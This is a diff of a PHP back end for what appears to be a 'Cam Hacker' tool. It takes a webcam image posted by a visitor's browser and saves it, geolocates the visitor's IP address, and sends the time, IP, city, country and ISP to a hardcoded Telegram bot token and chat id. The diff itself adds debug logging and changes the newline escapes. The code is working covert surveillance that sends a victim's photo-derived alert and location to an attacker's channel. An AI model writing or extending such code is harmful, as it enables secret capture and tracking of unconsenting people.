@@ -1,4 +1,6 @@
 <?php
+file_put_contents("debug.log", "Request received\\n", FILE_APPEND);
+
 $data = json_decode(file_get_contents("php://input"), true);
 $imageData = $data["image"];
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -9,14 +11,16 @@ file_put_contents("photo.jpg", $image);
 
 $geo = json_decode(file_get_contents("http://ip-api.com/json/" . $ip));
 
-$msg = "📸 Cam Hacker Alert!\n";
-$msg .= "🕒 Time: $date\n";
-$msg .= "🌐 IP: $ip\n";
-$msg .= "📍 Location: {$geo->city}, {$geo->regionName}, {$geo->country}\n";
+$msg = "📸 Cam Hacker Alert!\\n";
+$msg .= "🕒 Time: $date\\n";
+$msg .= "🌐 IP: $ip\\n";
+$msg .= "📍 Location: {$geo->city}, {$geo->regionName}, {$geo->country}\\n";
 $msg .= "🛰 ISP: {$geo->isp}";
 
 $token = "7480978370:AAFh8rnGTSwP7jp-yA9oFSEdrqyJYHRlILo";
 $chat_id = "-1264568426";
+
+file_put_contents("debug.log", "Sending data to Telegram\\n", FILE_APPEND);
 
 file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));
 
